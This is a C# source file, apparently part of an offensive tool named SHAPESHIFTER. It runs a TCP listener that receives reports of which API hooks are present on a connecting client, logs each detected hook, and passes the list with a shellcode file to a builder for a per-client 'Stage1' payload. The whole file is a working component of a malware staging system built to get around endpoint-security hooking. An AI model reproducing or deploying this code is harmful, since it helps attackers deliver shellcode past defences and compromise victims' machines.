using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;


namespace SHAPESHIFTER
{
    class TcpServer
    {
        public static void ServerInit(string address, int port, string shellcodeFile)
        {
            IPAddress ip = null;
            try
            {
                if (address == "127.0.0.1") ip = IPAddress.Any;
                else ip = IPAddress.Parse(address);
            }
            catch (FormatException fx)
            {
                Console.WriteLine(fx.Message);
            }

            TcpListener server = null;
            try
            {
                server = new TcpListener(ip, port);

                // Size of buffer we're expecting to receive
                byte[] bytes = new byte[19];


                server.Start();
                Console.Write("[>] Server started on {0}:{1}...\n\n", ip, port);
                while (true)
                {
                    // Perform a blocking call to accept requests.
                    TcpClient client = server.AcceptTcpClient();
                    Guid clientId = Guid.NewGuid();
                    Console.WriteLine("[+] New connection from {0} (ID: {1})", 
                        ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString(), clientId.ToString());

                    // Get a stream object for reading and writing
                    NetworkStream stream = client.GetStream();

                    int i;

                    // Loop to receive all the data sent by the client.
                    while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                    {
                        IList<string> hooks = Helpers.ResultsParser(bytes);
                        if (hooks.Count != 0)
                        {
                            foreach(string hook in hooks)
                            {
                                Console.WriteLine("[!] Hook detected on {0}!", hook.PadLeft(4));
                            }
                        }

                        if (!Compiler.BuildStage1(hooks, shellcodeFile, clientId.ToString()))
                        {
                            Console.WriteLine("[-] Failed to build Stage1");
                        }


                        //byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);

                        //// Send back a response.
                        //stream.Write(msg, 0, msg.Length);
                        //Console.WriteLine("Sent: {0}", data);
                    }

                    // Shutdown and end connection
                    client.Close();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Server Error: {0}", ex.Message);
                return;
            }
            finally
            {
                server.Stop();
            }
        }
    }
}
